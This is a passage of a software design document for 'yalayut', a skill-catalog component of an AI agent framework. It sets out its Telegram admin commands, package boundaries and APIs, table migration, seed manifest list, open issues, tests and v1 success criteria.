Recon finding: `awesome-cookiecutter` README is 404-rotted. v1 drops it; seed cookiecutter templates manually (3 in seed list).

### Telegram UX

- `/yalayut` — overview: counts by tier/type, vet queue depth, demand-signal backlog, source-candidate queue
- `/yalayut sources pending` — source-scout proposals: candidate card with metadata + sample artifact + `[Trust]` `[Untrust]` `[Reject]` `[Defer]`
- `/yalayut review <source>` — collapsed weekly digest of new/updated artifacts from a source as single decision
- `/yalayut pending` — per-artifact T2 escalations (rare, only when artifact triggers escalation)
- `/yalayut policy add <check> <key>` / `/yalayut policy review` — policy proposals from KutAI observation; founder approves
- `/yalayut disable <id>` / `/yalayut enable <id>` / `/yalayut requeue <id>` (for T3)
- `/yalayut source promote <id> <tier>` / `/yalayut owner promote <name>` — manual trust promotion
- `/yalayut stats` — A/B per exposure class (inject vs tool vs preempt vs sandbox) + inject render-variant (prose vs prebind vs checklist), success rates per source/owner, role-conflict ambiguity report
- `/yalayut discover "<intent>"` — founder-initiated demand signal (#4)
- `/yalayut scout <url>` — founder-mentioned candidate source
- `/yalayut auth missing` — artifacts blocked by missing env vars
- `/yalayut auth set <KEY>=<VALUE>` — write to yalayut-secret table (encrypted) and re-vet affected artifacts
- `/yalayut mcp status` — running MCP servers + health + tool counts
- `/yalayut mcp restart <id>` / `/yalayut mcp kill <id>` — manual MCP process control

### Interface contract

Core-loop packages (orchestrator, beckman) import **zero** from yalayut. yalayut is touched only by leaf shims: intersect + two mechanical executors + one post-hook.

**Dependency graph**:

```
orchestrator pump ──> intersect.flash(task)  ──> yalayut.query()
                  │      ├─ preempt:  route task → mechanical lane (recipe in payload)
                  │      └─ else:     attach task["skills"] = list[SkillApplication]
                  │
                  └──> _check_yalayut_discovery() / _check_source_scout()   (periodic, like
                            └─> beckman.enqueue({mechanical, action})        _check_todo_reminders)

beckman          ── routes mechanical tasks; runs post-hooks. 0 yalayut import.
mr_roboto exec   ── "yalayut_discovery" / "source_scout" / preempt recipe → yalayut.*
post-hook        ── "capture_hint" kind → yalayut.capture_hint
coulson          ── reads task["skills"], renders into agent prompt. 0 import.
```

**Component responsibilities**:

- **yalayut** = pure catalog. Imports zero KutAI packages (db + embeddings only). No prompt rendering, no exposure decision, no scheduling.
- **intersect** = thin match+expose. Match scoring, exposure-class decision, budget caps, static arg-binding, conflict resolution, `yalayut_usage` telemetry. Sole hot-path importer of yalayut. Invoked once per task by the orchestrator pump.
- **beckman** = unchanged. Routes the mechanical discovery/scout tasks + preempt tasks; runs the `capture_hint` post-hook. No yalayut import, no skill logic.
- **orchestrator** = `flash(task)` per task; `_check_*` periodic enqueue of discovery/scout mechanical tasks (enqueues a plain dict — 0 yalayut import).
- **coulson** = reads `task["skills"]`, renders into agent prompt. Imports neither package.
- **mr_roboto** = preempt recipe steps baked into mechanical payload (shell exec it already does); `yalayut_discovery` + `source_scout` executors (leaf shims importing yalayut).
- **`src/memory/skills.py`** = thin shim returning `task["skills"]` filtered to `inject`, until coulson fully migrated; then deleted.
- **`src/app/telegram_bot.py`** = `/yalayut ...` command group → `yalayut.admin`.
- **`workflow_engine` / i2p** = per-step `recipe_lookup: true|false` + `recipe_hint` (JSON data fields, no code coupling).

### Public APIs

**`packages/yalayut/` — operational API** (`yalayut/__init__.py`):

```python
def query(task_ctx: dict) -> list[Artifact]      # hot read; intersect's only entry. vector sim over index.
def daily_discovery() -> dict                     # mechanical-executor body: pull trusted, fetch+synth+tier+enable
def source_scout_scan() -> dict                   # mechanical-executor body: propose candidate sources
def on_demand_discovery(demand: dict) -> dict      # need-driven fetch for one DemandSignal
def capture_hint(task: dict, outcome: dict) -> None  # post-hook body: internal_hint auto-capture
def run_recipe(recipe_id: str, args: dict) -> dict   # mr_roboto preempt executor body
```

**`packages/yalayut/admin.py` — founder/Telegram ops** (imported only by `telegram_bot.py`):

```
pending_artifacts() approve_artifact(id) reject_artifact(id) requeue(id)
pending_sources()   approve_source(...)  promote_source(id,tier) promote_owner(name)
policy_proposals()  decide_policy(...)   disable(id) enable(id)  stats()
missing_auth()      set_secret(key,value)
mcp_status()        mcp_restart(id)      mcp_kill(id)
```

**`packages/intersect/` — entry** (`intersect/__init__.py`):

```python
def flash(task: dict) -> dict
    """Match skills for task, attach task['skills'] envelope, route preempt to
       mechanical lane. Called once per task by orchestrator pump. Errors →
       graceful degrade (empty skills list), logged, never propagates."""
```

One public function. `query()` returns the `Artifact` dataclass (in-process; intersect imports yalayut regardless). Everything crossing a serialization boundary — `task["skills"]`, discovery task specs, recipe payloads — is plain dict.

**Envelope contract — `task["skills"]`** (list of dicts; no shared type import, crosses DB/JSON):

```python
{
  "artifact_id": int,
  "name": str,
  "exposure_class": "inject" | "tool" | "preempt",
  "applies_to": "execution",          # v1: execution only
  "render": "prose" | "prebind",      # inject sub-variant
  "payload": {...},                    # class-specific: skill body / tool spec / bound call
  "confidence": float,
}
```

`preempt` does not ride the envelope — intersect routes that task to the mechanical lane; recipe + bound args go in the mechanical task payload.

**Rendering ownership**: `SkillApplication` is structured data, not text. coulson renders it into its agent prompt. intersect never knows prompt conventions.

**v1 coupling cuts** (deferred to v1.1):
- **LLM-bind / BindTask dropped** — prebind uses static `bind_from` + cache only; unbound fields fall back to plain prose `inject`. No `intersect → beckman.enqueue(BindTask)`, no overhead-lane bind handler.
- **Grading-skills deferred** — v1 exposes to execution only (coulson). `grade_task` untouched; `applies_to` always `execution`. Rubric-into-`GRADING_PROMPT` is v1.1.
- **Sandbox deferred** — T2 artifacts stay quarantined-until-founder-promotes in v1 (treated like T3). No `sandbox` exposure, no mr_roboto `sandbox_run`.

### Migration

1. Create all 13 new tables (`yalayut_index`, `yalayut_usage`, `yalayut_sources`, `yalayut_owners`, `yalayut_disabled_imports`, `yalayut_bind_cache`, `yalayut_mcp_processes`, `yalayut_mcp_tools`, `yalayut_secrets`, `yalayut_policy`, `yalayut_policy_proposals`, `yalayut_source_candidates`, `yalayut_demand_signals`)
2. Seed `yalayut_policy` with baseline allowlists (shell: npx/git/cookiecutter/npm/pip/uvx; injection_regex set; domain_allowlist starter)
3. Seed `yalayut_owners` with `anthropics`, `obra`, `wshobson`, `cookiecutter`, `matlab` (trusted)
4. Seed `yalayut_sources` with 5 canonical sources (`github:anthropics/skills@/skills`, `github:obra/superpowers@/skills`, etc.), all `discovery_mode=cron`
5. Seed `yalayut_disabled_imports` with known rejects (using-superpowers, using-git-worktrees, mcp-browser-use, joke-APIs)
6. Drop seed manifests into `packages/yalayut/seed/manifests/*.yaml` (top-20, hand-authored)
7. Migration script: copy `skills` rows → `yalayut_index` (`artifact_type='skill'`, `kind='internal_hint'`, exposure_class='inject', tier=T0, source='internal'), embed `description+strategy_summary`
8. First discovery cron run pulls canonical sources, auto-tiers; source-scout cron starts proposing untrusted candidates
9. Old `skills.py` API kept as thin shim (returns `task.skills` filtered to `inject`) until coulson/grading paths fully migrate

## Seed manifest list (v1 ship)

Hand-author in `packages/yalayut/seed/manifests/`. Ranked by `usability × value` per recon:

All exposed via `inject` unless noted. `applies_to` in parens.

1. `anthropics-pdf` — prompt_skill, T0 (execution)
2. `anthropics-docx` — prompt_skill, T0 (execution)
3. `anthropics-xlsx` — prompt_skill, T0 (execution)
4. `anthropics-pptx` — prompt_skill, T0 (execution)
5. `anthropics-mcp-builder` — prompt_skill, T0 (execution)
6. `anthropics-skill-creator` — prompt_skill, T0 (execution; self-grow)
7. `anthropics-claude-api` — prompt_skill, T0 (execution; cross-link to caveman plugin)
8. `superpowers-brainstorming` — prompt_skill, T0 (execution)
9. `superpowers-tdd` — prompt_skill, T0 (execution; wire into coder reflection)
10. `superpowers-systematic-debugging` — prompt_skill, T0 (execution; wire into fixer)
11. `superpowers-writing-plans` — prompt_skill, T0 (execution)
12. `superpowers-subagent-driven-development` — prompt_skill, T0 (execution)
13. `superpowers-verification-before-completion` — prompt_skill checklist, T0 (grading)
14. `wshobson-backend-architect` — agent_config, T0 (execution)
15. `wshobson-security-auditor` — agent_config, T0 (execution)
16. `wshobson-performance-engineer` — agent_config, T0 (execution)
17. `wshobson-test-automator` — agent_config, T0 (execution)
18. `cc-pypackage` — shell_recipe, T1, mechanizable=true (execution; prebind/preempt)
19. `cc-django` — shell_recipe, T1, mechanizable=true (execution; post-gen hook audit needed)
20. `cc-data-science` — shell_recipe, T1, mechanizable=true (execution)

## Open issues (defer to plan, not blocking design)

- Threshold defaults (θ_preempt, θ_inject, θ_tool, θ_min) — start strict, lower based on telemetry
- `intersect` package vs module — thin enough to be a module; plan author decides packaging
- `applies_to` inference edge cases — a `prompt_skill` that's useful both as execution guidance and grading rubric (dual-tag allowed?)
- Multi-file skill vetting UX (anthropics xlsx has helper Python files) — file tree + per-file approve vs all-or-nothing
- Rate limit handling for GitHub API in source adapters (gh CLI vs raw REST; auth required for high volume)
- LLM-assisted prompt-injection vetting beyond regex (v1.1)
- API rate limit tracking — hook into `kuleden_donen_var` provider tracker, or duplicate. v1.1.
- API response shape declaration (OpenAPI ref or sample response in manifest) — v1.1
- Multi-call API procedures (procedure kind extended for API chaining) — v1.1
- Paid-tier API consent UX (per-call cost surface; founder approve threshold) — v1.1
- Bind cache eviction tuning (LRU + manifest-version invalidate; how aggressive). Invalidation trigger: when cached args produce step failure twice in a row, invalidate cache row + refire LLM bind next time.
- MCP idle-timeout default (300s starter; observe before tightening)
- `mechanizable` flag authority — adapter inference (presence of `invocation.steps`) plus vetter override; seed manifests explicit
- Bash-vs-PowerShell normalization for cookiecutter post-gen hooks on Windows
- Demand-signal cooldown windows — start at 7d per source_step_pattern
- Recipe drift residual on `tool` exposure — model paraphrasing shell into freehand python. Accepted residual risk; `preempt` + prebind-rendered `inject` are the antidote when applicable.

## Testing strategy

- **Unit**: each source adapter against fixture HTTP responses; each parser against frozen sample artifacts
- **Unit**: each auto-check against positive/negative fixtures (shell with `chmod`, injection regex hits, etc.)
- **Unit**: tier_classifier — verify `max(min(source,owner), *checks)` semantics across all combinations
- **Unit**: each plugin's `parse_manifest` / `vet_checks` / `to_application` / `bind_args` / `execute`
- **Unit**: intersect — scoring, exposure-class decision per (tier × kind × confidence) tuple, budget caps, conflict resolution, failure-isolation graceful degrade
- **Integration**: end-to-end fetch → synthesize → tier → enable → query → intersect → SkillApplication, mocked sources for all 6 adapter types
- **Integration**: prebind flow — static-bind, cache-hit, cold cache-miss → prose-inject fallback (v1 has no LLM-bind)
- **Integration**: envelope round-trip — intersect attaches `task["skills"]`; coulson reads `execution` slice
- **Telemetry**: assert `yalayut_usage` rows written on each `flash()` with correct `exposure_class`
- **Migration**: existing `skills` rows readable via `skills.py` shim with byte-identical injection output for `exposure_class=inject`
- **Recon-driven**: replay sampled artifacts from recon (~120) through synthesis pipeline; verify tier distributions match recon predictions

## Success criteria (v1 ship)

- All 13 tables created + migration runs cleanly
- `yalayut` and `intersect` ship as separate components; yalayut imported only by intersect; beckman carries no skill-matching logic
- 20 seed manifests installed; intersect matches them against ≥3 i2p missions
- 6 source adapters operational; `github_path` + `public_apis_md` + `cookiecutter_template` fully mechanical (no LLM in steady state)
- Anthropics/skills + obra/superpowers fully imported via discovery cron (47+ artifacts)
- Source-scout proposes ≥3 new sources within first week; Telegram UX functional
- At least one `preempt` end-to-end on a real i2p mission (cookiecutter scaffold)
- `inject` exercised in both v1 render variants: prose hint, and prebind concrete-call (with static-bind + cache-hit on 2nd mission)
- agent_config `inject` end-to-end: `wshobson-backend-architect` content shapes a backend-design step's agent prompt
- discovery + source-scout run as observable mechanical tasks (visible in task list, retryable)
- Existing internal-hint matching produces byte-identical injection output post-migration
- `/yalayut stats` shows per-exposure-class A/B across ≥3 missions
- **v1.1 scope** (not v1 ship): LLM-bind, grading-skills/rubric, sandbox/T2-exposure
